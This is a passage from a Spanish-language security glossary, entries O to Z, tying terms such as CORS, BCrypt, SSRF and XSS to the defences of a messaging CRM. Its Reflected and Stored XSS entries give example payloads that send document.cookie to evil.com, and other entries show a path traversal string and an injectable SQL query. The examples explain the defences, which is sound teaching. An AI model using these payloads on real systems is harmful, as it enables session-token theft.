**Categoría:** Node.js / Seguridad
**Definición:** Comando de npm que analiza el árbol de dependencias del proyecto JavaScript/TypeScript contra la base de datos de advisories de seguridad de npm y reporta paquetes con CVEs conocidos junto con su severidad y la versión corregida.
**En el proyecto:** El pipeline de CI/CD del front del sistema de mensajería (React) debe ejecutar `npm audit --audit-level=high` en cada build. Las dependencias con CVEs de severidad alta o crítica deben ser actualizadas antes del despliegue.

---

## O

### OWASP (Open Web Application Security Project)
**Categoría:** Seguridad
**Definición:** Fundación sin fines de lucro que produce estándares, guías, herramientas y el famoso "OWASP Top 10"  -  una lista actualizada periódicamente de las vulnerabilidades de aplicaciones web más críticas. La versión vigente es el OWASP Top 10 2021.
**En el proyecto:** El checklist de seguridad del sistema de mensajería se basa en el OWASP Top 10 2021. Cada categoría tiene una mitigación concreta en el código del proyecto que el equipo debe conocer y saber implementar.

### Ownership Verification
**Categoría:** Autorización / Seguridad
**Definición:** Práctica de verificar explícitamente en el handler o servicio que el recurso solicitado pertenece al contexto del usuario autenticado (workspace, tenant, organización), no solo que el usuario está autenticado. Es la mitigación principal contra Broken Access Control (A01).
**En el proyecto:** En cada handler del sistema de mensajería que accede a `Conversation`, `Contact` o `Message`, se verifica `conversation.WorkspaceId == request.WorkspaceId`. Esta verificación vive en el handler, no en el controlador, para que sea imposible olvidarla.

---

## P

### Parámetros Nombrados (Named Parameters)
**Categoría:** Seguridad / SQL
**Definición:** Mecanismo de las librerías de acceso a datos (Dapper, ADO.NET, EF Core) donde los valores del usuario se pasan como parámetros separados del texto SQL (`@email`, `@contactId`). La librería se encarga de escapar correctamente los valores, haciendo imposible la inyección SQL independientemente del contenido del parámetro.
**En el proyecto:** Todas las queries Dapper del sistema de mensajería usan `new { email }`, `new { contactId }` como objeto de parámetros. El string SQL solo contiene `@email`, `@contactId` como placeholders  -  nunca interpolación de strings.

### Path Traversal
**Categoría:** Seguridad / Inyección
**Definición:** Ataque donde el usuario manipula un path de archivo (p. ej. `../../../etc/passwd`) para acceder a archivos fuera del directorio esperado. Se mitiga validando que la ruta resultante (`Path.GetFullPath`) comience con el directorio permitido antes de leer o escribir el archivo.
**En el proyecto:** El módulo de carga de archivos del sistema de mensajería (adjuntos en mensajes de WhatsApp) debe verificar que la ruta del archivo subido permanece dentro del directorio de uploads configurado, usando `Path.GetFullPath` y comparando con `_uploadDir`.

### Permissions-Policy
**Categoría:** HTTP / Headers de seguridad
**Definición:** Header HTTP (anteriormente llamado `Feature-Policy`) que permite al servidor restringir o deshabilitar características del browser en la página, como acceso a cámara, micrófono, geolocalización, USB y otras APIs potencialmente sensibles. Reduce la superficie de ataque en caso de XSS.
**En el proyecto:** La API del sistema de mensajería envía `Permissions-Policy: camera=(), microphone=(), geolocation=()` para desactivar APIs del browser que la aplicación no utiliza, limitando lo que un script XSS podría hacer incluso si lograra ejecutarse.

### Pipeline Behavior
**Categoría:** MediatR / .NET
**Definición:** Componente de MediatR que intercepta requests antes y/o después del handler, similar a un middleware pero a nivel de la capa de aplicación. Se usa para cross-cutting concerns como validación, logging, autorización, manejo de excepciones y performance monitoring.
**En el proyecto:** El sistema de mensajería puede implementar un `ValidationBehavior` que ejecuta FluentValidation antes de cada handler y un `LoggingBehavior` que registra el nombre del command/query y su resultado, incluyendo intentos de acceso denegados.

### Política CORS (CORS Policy)
**Categoría:** ASP.NET Core / CORS
**Definición:** Conjunto de reglas con nombre que define qué orígenes, métodos y headers están permitidos para requests cross-origin. Se registra en el DI con `builder.Services.AddCors()` y se aplica al pipeline con `app.UseCors("nombre")`. Distintas políticas pueden aplicarse a distintos grupos de endpoints.
**En el proyecto:** El sistema de mensajería define una política `"AllowedOrigins"` que permite solo los dominios propios del producto. Esta política se aplica globalmente con `app.UseCors("AllowedOrigins")` antes de los middlewares de autenticación.

### Preflight Request
**Categoría:** CORS / HTTP
**Definición:** Request HTTP `OPTIONS` que el browser envía automáticamente antes de una request cross-origin con métodos distintos a GET/POST simple o con headers personalizados. El servidor debe responder con los headers CORS correctos para que el browser proceda con la request real.
**En el proyecto:** El front del sistema de mensajería en `app.example.com` que llama a la API en `api.example.com` dispara preflight requests. El middleware CORS de ASP.NET Core responde automáticamente si el origen está en la lista `WithOrigins`.

---

## Q

### QueueLimit
**Categoría:** ASP.NET Core / Rate Limiting
**Definición:** Propiedad del `RateLimiterOptions` que determina cuántas solicitudes pueden estar en cola esperando un slot disponible. Cuando se establece en `0`, las solicitudes que superan el límite son rechazadas inmediatamente con el código HTTP configurado en `RejectionStatusCode`.
**En el proyecto:** Para el endpoint de login del sistema de mensajería, `QueueLimit = 0` significa que el intento número 6 en 15 minutos recibe inmediatamente un `429 Too Many Requests`, sin esperar en cola.

---

## R

### Rainbow Table
**Categoría:** Criptografía / Ataque
**Definición:** Tabla precalculada de pares hash-contraseña que permite invertir un hash conocido consultando la tabla en lugar de calcular hashes en tiempo real. Es efectivo contra hashes sin salt (MD5, SHA-256 de contraseñas comunes). BCrypt lo hace inviable porque el salt único por contraseña hace que cada hash sea diferente incluso para la misma contraseña.
**En el proyecto:** BCrypt en el sistema de mensajería genera un salt único por cada contraseña, haciendo inútiles las rainbow tables: aunque un atacante tuviera la tabla más grande del mundo, no podría usarla contra los hashes de la base de datos del CRM.

### Rate Limiting
**Categoría:** Seguridad / ASP.NET Core
**Definición:** Mecanismo que limita la cantidad de solicitudes que un cliente (identificado por IP, API key, usuario) puede realizar en un período de tiempo. Protege contra ataques de fuerza bruta, scraping masivo y denegación de servicio (DoS). ASP.NET Core proporciona el middleware `AddRateLimiter` con cuatro estrategias integradas.
**En el proyecto:** El sistema de mensajería aplica rate limiting de 5 intentos/15 min al endpoint de login, y puede aplicar límites más permisivos (p. ej. 100 req/min por workspace) a los endpoints de la API general para proteger contra abuso.

### Referrer-Policy
**Categoría:** HTTP / Headers de seguridad
**Definición:** Header HTTP que controla qué información de URL se incluye en el header `Referer` cuando el usuario navega desde tu página a otro sitio. `strict-origin-when-cross-origin` envía solo el origen (sin path ni query string) en requests cross-origin, previniendo la filtración de información sensible en URLs.
**En el proyecto:** La API del sistema de mensajería envía `Referrer-Policy: strict-origin-when-cross-origin` para evitar que URLs internas del sistema (que pueden contener IDs de conversaciones o tokens temporales en query string) sean enviadas a sitios terceros.

### Reflected XSS
**Categoría:** Seguridad / XSS
**Definición:** Variante de XSS donde el script malicioso se incluye en el request (típicamente en la URL como query parameter) y el servidor lo "refleja" sin escapar en la respuesta HTML. El atacante debe convencer a la víctima de que haga click en un enlace especialmente construido. No persiste en la base de datos.
**En el proyecto:** Si el front del sistema de mensajería renderiza el parámetro `?search=` directamente en la página sin escapar, un atacante podría enviar un URL como `?search=<script>document.location='http://evil.com?c='+document.cookie</script>` a un agente.

### Regex (Expresión Regular)
**Categoría:** Programación / Seguridad
**Definición:** Patrón de coincidencia de texto usado en seguridad para validar que el input del usuario tiene el formato esperado antes de procesarlo. Una validación con regex restrictivo (allowlist) rechaza cualquier carácter no esperado, previniendo inyecciones en el input.
**En el proyecto:** En el módulo de conversión de archivos del sistema de mensajería, el nombre del archivo se valida con `Regex.IsMatch(fileName, @"^[a-zA-Z0-9_\-\.]+$")` para rechazar nombres que contengan caracteres de shell (`&`, `;`, `|`, etc.).

### RejectionStatusCode
**Categoría:** ASP.NET Core / Rate Limiting
**Definición:** Propiedad de `RateLimiterOptions` que define el código de estado HTTP devuelto cuando se rechaza un request por exceder el límite configurado. El valor correcto según RFC 6585 es `429 Too Many Requests`.
**En el proyecto:** El middleware de rate limiting del sistema de mensajería devuelve `429 Too Many Requests` (código `StatusCodes.Status429TooManyRequests`) cuando un agente o atacante supera el límite de intentos de login.

---

## S

### Salt (Criptográfico)
**Categoría:** Criptografía / Passwords
**Definición:** Valor aleatorio único generado para cada contraseña antes de hacer el hash. Previene que dos usuarios con la misma contraseña tengan el mismo hash, y hace inútiles los ataques con rainbow tables (tablas pre-calculadas de hashes). BCrypt genera e incluye el salt automáticamente en el resultado del hash.
**En el proyecto:** BCrypt en el sistema de mensajería genera un salt único por cada contraseña de agente. El string resultante del hash incluye el salt, por lo que no es necesario almacenarlo en una columna separada.

### SameSite (Cookie)
**Categoría:** Seguridad / HTTP
**Definición:** Atributo de cookie que controla cuándo el browser envía la cookie en requests cross-site. `Strict` solo envía la cookie si el request se origina exactamente en el mismo sitio. `Lax` permite algunas navegaciones cross-site (links). `None` siempre la envía (requiere `Secure`). Es la principal mitigación contra CSRF.
**En el proyecto:** El sistema de mensajería usa `SameSite=Strict` en el access token cookie. Esto garantiza que si un usuario autenticado visita un sitio malicioso, el browser no adjuntará el token a requests forjados hacia la API del CRM.

### Secure (Cookie)
**Categoría:** Seguridad / HTTP
**Definición:** Atributo de cookie que instruye al browser a enviar la cookie únicamente en conexiones HTTPS. Sin este atributo, la cookie podría ser enviada por HTTP y ser interceptada por un atacante en la red (ataque man-in-the-middle). Siempre debe combinarse con `HttpOnly` y `SameSite`.
**En el proyecto:** La cookie del access token del sistema de mensajería tiene `Secure=true` para garantizar que nunca viaja por HTTP, complementando la redirección HTTPS del servidor.

### Security Misconfiguration
**Categoría:** OWASP Top 10
**Definición:** Ver A05  -  Security Misconfiguration. Nombre completo de la categoría para referencia. Incluye headers faltantes, puertos innecesarios abiertos, cuentas por defecto, mensajes de error con stack traces expuestos y cualquier configuración que reduzca la posición de seguridad sin una justificación técnica.
**En el proyecto:** El sistema de mensajería mitiga A05 con un middleware que agrega todos los headers de seguridad en un punto centralizado, con Kestrel configurado para no exponer el header `Server`, y con variables de entorno que controlan el nivel de detalle de los errores.

### Secretos (Secrets)
**Categoría:** Seguridad / Configuración
**Definición:** Valores de configuración sensibles que, si se exponen, permiten acceso no autorizado a sistemas o datos: connection strings de base de datos, claves de cifrado JWT, tokens de API de terceros, contraseñas de servicios. La regla cardinal es que nunca deben estar en el repositorio Git ni en logs.
**En el proyecto:** Los secretos del sistema de mensajería incluyen: `ConnectionStrings:Default`, `Jwt:Secret`, `WhatsApp:ApiToken` e `Instagram:AppSecret`. Se gestionan con `dotnet user-secrets` en desarrollo y AWS Secrets Manager / Azure Key Vault en producción.

### Serilog
**Categoría:** .NET / Logging
**Definición:** Librería de logging estructurado para .NET que permite emitir logs como objetos con propiedades indexables (JSON), en lugar de strings planos. Integra con destinos (sinks) como consola, archivos, Seq, CloudWatch, Application Insights. El logging estructurado facilita la búsqueda y las alertas.
**En el proyecto:** El sistema de mensajería usa Serilog para registrar eventos de seguridad (login fallido, acceso denegado, webhook inválido) con propiedades estructuradas como `{AgentId}`, `{WorkspaceId}`, `{ConversationId}` que pueden filtrarse en CloudWatch Insights.

### SHA-256
**Categoría:** Criptografía / Algoritmo
**Definición:** Función de hash criptográfico de 256 bits, parte de la familia SHA-2. Diseñada para ser rápida (útil para checksums de archivos, firmas digitales, HMAC), pero por esa misma razón es inadecuada para hashing de contraseñas: las GPU modernas calculan miles de millones de hashes SHA-256 por segundo.
**En el proyecto:** El sistema de mensajería usa SHA-256 exclusivamente para firmas HMAC de webhooks (donde la velocidad es necesaria y la clave secreta protege el resultado), nunca para contraseñas de agentes (donde se usa BCrypt).

### SignalR
**Categoría:** ASP.NET Core / Real-time
**Definición:** Librería de ASP.NET Core que abstrae la comunicación en tiempo real entre servidor y clientes usando WebSockets (con fallbacks a Server-Sent Events y long polling). Requiere que la política CORS permita el origen del front y que el endpoint WebSocket (`wss://`) esté en la CSP `connect-src`.
**En el proyecto:** El sistema de mensajería usa SignalR para notificar a los agentes de nuevos mensajes en tiempo real. La CSP incluye `connect-src 'self' wss://crm.example.com` para permitir las conexiones WebSocket de SignalR.

### SQL Injection
**Categoría:** Seguridad / OWASP A03
**Definición:** Ataque donde el input del usuario se incorpora directamente en una query SQL, modificando la lógica de la consulta. Puede permitir al atacante extraer toda la base de datos, modificar o eliminar datos, o ejecutar comandos en el servidor de base de datos. Es mitigable al 100% usando parámetros.
**En el proyecto:** La búsqueda de contactos por email en el sistema de mensajería sería vulnerable si el SQL se construye como `$"SELECT * FROM Contacts WHERE Email = '{email}'"`. La solución es `"SELECT * FROM Contacts WHERE Email = @email"` con `new { email }` como objeto de parámetros.

### SSRF (Server-Side Request Forgery)
**Categoría:** OWASP Top 10 / Seguridad
**Definición:** Ver A10  -  SSRF. Nombre completo para referencia cruzada. Es el vector de ataque #10 en el OWASP Top 10 2021 y resulta especialmente peligroso en entornos cloud donde el metadata endpoint de la instancia (`169.254.169.254`) puede revelar credenciales IAM temporales.
**En el proyecto:** Cualquier funcionalidad del sistema de mensajería que descargue contenido de URLs externas (previews de links en mensajes, importación de avatares de contactos) debe validar que la URL no apunta a rangos de IP privados (`10.x.x.x`, `172.16.x.x`, `192.168.x.x`, `169.254.x.x`).

### SSL Stripping
**Categoría:** Seguridad / Ataque de red
**Definición:** Ataque de red donde un intermediario intercepta la primera conexión HTTP de la víctima (antes de la redirección a HTTPS) y actúa como proxy: la víctima se comunica por HTTP con el atacante, y el atacante se comunica por HTTPS con el servidor legítimo. El usuario no sabe que su conexión no está cifrada. HSTS previene este ataque.
**En el proyecto:** El sistema de mensajería usa HSTS con `max-age=31536000` para que el browser de los agentes recuerde durante un año que debe usar HTTPS directamente, sin intentar HTTP en ningún momento, previniendo SSL stripping.

### Stored XSS
**Categoría:** Seguridad / XSS
**Definición:** Variante más peligrosa de XSS donde el script malicioso se almacena en la base de datos (como parte de un mensaje, comentario o campo de texto) y se ejecuta cada vez que otro usuario visualiza ese contenido. A diferencia del Reflected XSS, el atacante no necesita que la víctima haga click en un enlace específico.
**En el proyecto:** Un contacto podría enviar un mensaje de WhatsApp que contenga `<script>fetch('https://evil.com?token='+document.cookie)</script>`. Si el front del sistema de mensajería renderiza ese mensaje con `dangerouslySetInnerHTML` sin sanitizar, el script se ejecutaría en el browser de todos los agentes que vean la conversación.

---

## T

### Thumbprint (Certificate Thumbprint)
**Categoría:** Criptografía / mTLS
**Definición:** Hash (SHA-1 o SHA-256) del contenido de un certificado X.509 que funciona como identificador único del certificado. En implementaciones de mTLS se usa para validar que el certificado del cliente que se conecta es exactamente el esperado, no solo que está firmado por una CA conocida.
**En el proyecto:** En el ejemplo de mTLS del sistema de mensajería, el servidor valida que el `ctx.ClientCertificate.Thumbprint` coincida con el thumbprint esperado del servicio interno. Esto garantiza que solo el servicio legítimo puede comunicarse con ese endpoint.

### TLS (Transport Layer Security)
**Categoría:** Criptografía / Protocolos
**Definición:** Protocolo criptográfico que proporciona comunicación segura sobre redes. Sucesor de SSL. Garantiza confidencialidad (cifrado simétrico del canal tras el handshake), integridad (MAC de cada mensaje) y autenticidad del servidor (certificado X.509 firmado por una CA de confianza). TLS 1.3 es la versión actual recomendada.
**En el proyecto:** Todo el tráfico del sistema de mensajería (browser a API, API a PostgreSQL, API a WhatsApp) debe usar TLS 1.2 mínimo, preferiblemente TLS 1.3. Los certificados TLS en producción se gestionan con ACM (AWS) o con Let's Encrypt en VPS.

---

## U

### UseHsts
**Categoría:** ASP.NET Core / HTTPS
**Definición:** Método de extensión de `IApplicationBuilder` en ASP.NET Core que agrega el middleware que envía el header `Strict-Transport-Security` en todas las respuestas HTTPS. Debe colocarse antes de `UseRouting` y después de `UseHttpsRedirection` en el pipeline.
**En el proyecto:** El `Program.cs` del sistema de mensajería llama `app.UseHsts()` inmediatamente después de `app.UseHttpsRedirection()` para instruir al browser a usar HTTPS exclusivamente durante el siguiente año.

### UseHttpsRedirection
**Categoría:** ASP.NET Core / HTTPS
**Definición:** Middleware de ASP.NET Core que redirige automáticamente cualquier request HTTP a su equivalente HTTPS con un redirect `301` (permanente) o `307` (temporal). Es la primera capa de redirección; HSTS es la segunda (instrucción al browser para no intentar HTTP).
**En el proyecto:** `app.UseHttpsRedirection()` en el `Program.cs` del sistema de mensajería garantiza que si alguien accede a `http://api.example.com/...` es redirigido a `https://api.example.com/...` antes de que cualquier dato sensible sea enviado.

### UseRateLimiter
**Categoría:** ASP.NET Core / Middleware
**Definición:** Método de extensión de `IApplicationBuilder` que activa el middleware de rate limiting en el pipeline de ASP.NET Core. Debe colocarse antes de los middlewares de autenticación y autorización para que pueda rechazar requests antes de procesarlos completamente.
**En el proyecto:** `app.UseRateLimiter()` en el `Program.cs` del sistema de mensajería activa el middleware que aplica las políticas configuradas en `AddRateLimiter`, incluyendo la política `"login"` para el endpoint de autenticación.

---

## V

### Vulnerable Components
**Categoría:** OWASP Top 10
**Definición:** Ver A06  -  Vulnerable and Outdated Components. Referencia por nombre descriptivo. La gestión de dependencias es responsabilidad continua: una librería segura hoy puede tener un CVE mañana. Los proyectos deben tener un proceso definido de auditoría y actualización de dependencias.
**En el proyecto:** El sistema de mensajería depende de librerías como `BCrypt.Net`, `MediatR`, `Serilog`, paquetes de AWS SDK y módulos npm de React. Cada una debe mantenerse actualizada y auditada periódicamente.

---

## W

### WebSocket (wss://)
**Categoría:** HTTP / Protocolos
**Definición:** Protocolo de comunicación bidireccional y persistente entre cliente y servidor que comienza con un handshake HTTP (upgrade) y luego opera sobre TCP directamente. La variante `wss://` (WebSocket Secure) usa TLS para cifrar el canal. SignalR lo usa como transporte preferido.
**En el proyecto:** SignalR en el sistema de mensajería establece conexiones `wss://crm.example.com/hubs/messages` para la bandeja de mensajes en tiempo real. La CSP del servidor incluye `connect-src 'self' wss://crm.example.com` para permitir explícitamente estas conexiones.

### WithOrigins
**Categoría:** ASP.NET Core / CORS
**Definición:** Método del builder de política CORS en ASP.NET Core que especifica la lista de orígenes permitidos. Solo los dominios incluidos en esta lista reciben el header `Access-Control-Allow-Origin` en la respuesta. Es la alternativa segura a `AllowAnyOrigin()`.
**En el proyecto:** La política CORS del sistema de mensajería usa `.WithOrigins("https://app.example.com", "https://admin.example.com")` para permitir únicamente los dominios propios del producto, bloqueando cualquier otro origen.

### workFactor (BCrypt)
**Categoría:** Criptografía / BCrypt
**Definición:** Parámetro de BCrypt que controla el número de iteraciones del algoritmo mediante una escala logarítmica en base 2. Un `workFactor` de 12 significa 2^12 = 4.096 iteraciones, produciendo aproximadamente 250 ms de cómputo por hash en hardware moderno. Se debe incrementar con el tiempo a medida que el hardware mejora.
**En el proyecto:** El sistema de mensajería usa `workFactor: 12` para el hashing de contraseñas de agentes. Este valor debe revisarse anualmente; cuando el hardware permita hashes en menos de 100 ms, se debe incrementar a 13 o 14 para mantener la resistencia a fuerza bruta.

### Workspace (Workspace Isolation)
**Categoría:** Multi-tenancy / Seguridad
**Definición:** Unidad de aislamiento de datos en el sistema de mensajería que agrupa a los agentes, conversaciones, contactos y canales de una empresa cliente. El aislamiento garantiza que ningún agente de un workspace pueda acceder a los datos de otro, incluso si comparten la misma infraestructura.
**En el proyecto:** Cada entidad del sistema de mensajería (`Conversation`, `Contact`, `Message`, `Channel`) tiene una columna `WorkspaceId`. Los handlers verifican que el `WorkspaceId` del recurso coincide con el del agente autenticado; los EF Core global query filters agregan automáticamente ese filtro en todas las queries.

---

## X

### X.509 Certificate
**Categoría:** Criptografía / PKI
**Definición:** Estándar ITU-T para certificados de clave pública. Contiene la clave pública del propietario, información de identidad (Common Name, SAN), la CA que lo firmó, y un período de validez. Se usa en TLS para autenticar servidores y, en mTLS, también para autenticar clientes.
**En el proyecto:** Los servicios internos del sistema de mensajería que se autentican mutuamente con mTLS presentan certificados X.509 emitidos por una CA interna. El servidor verifica el thumbprint del certificado del cliente contra el valor esperado del servicio interno.

### X-Content-Type-Options
**Categoría:** HTTP / Headers de seguridad
**Definición:** Header HTTP con valor `nosniff` que indica al browser que no intente inferir el tipo de contenido del recurso ignorando el `Content-Type` declarado. Sin este header, el browser puede interpretar un archivo de texto como JavaScript y ejecutarlo, facilitando ciertos ataques XSS.
**En el proyecto:** La API del sistema de mensajería envía `X-Content-Type-Options: nosniff` en todas las respuestas a través del middleware de headers de seguridad en `Program.cs`.

### X-Frame-Options
**Categoría:** HTTP / Headers de seguridad
**Definición:** Header HTTP que controla si el browser permite que la página sea embebida en un `<iframe>`. El valor `DENY` bloquea el embedding desde cualquier origen. Previene ataques de clickjacking donde un sitio malicioso superpone la aplicación en un iframe invisible para capturar clics del usuario.
**En el proyecto:** El sistema de mensajería envía `X-Frame-Options: DENY` en todas las respuestas para evitar que la aplicación de los agentes sea embebida en iframes de sitios maliciosos que podrían intentar capturas de credenciales por clickjacking.

### XSS (Cross-Site Scripting)
**Categoría:** Seguridad / OWASP
**Definición:** Vulnerabilidad donde un atacante logra inyectar y ejecutar scripts JavaScript maliciosos en el browser de otros usuarios. Permite robar tokens de sesión, redirigir usuarios, modificar el DOM o enviar requests autenticadas en nombre de la víctima. Existen tres variantes: Reflected, Stored y DOM-based.
**En el proyecto:** El sistema de mensajería recibe mensajes de usuarios externos (WhatsApp, Instagram) que podrían contener scripts XSS. La defensa en profundidad combina: escape automático de React, prohibición de `dangerouslySetInnerHTML` sin DOMPurify, CSP restrictiva y cookies HttpOnly que impiden el robo del token incluso si XSS se ejecuta.

---

## Z

### Zero Trust
**Categoría:** Arquitectura de Seguridad
**Definición:** Modelo de seguridad que elimina la confianza implícita basada en la ubicación en la red. Cada request se verifica independientemente de si proviene de internet o de la red interna. Se basa en cinco pilares: verificar identidad, verificar dispositivo, least privilege, inspeccionar tráfico y asumir breach.
**En el proyecto:** El sistema de mensajería implementa Zero Trust verificando la identidad (JWT + MFA), aplicando least privilege con claims granulares, validando ownership del recurso en cada handler y cifrando el tráfico interno (TLS). La premisa es que ningún servicio ni red es inherentemente confiable.
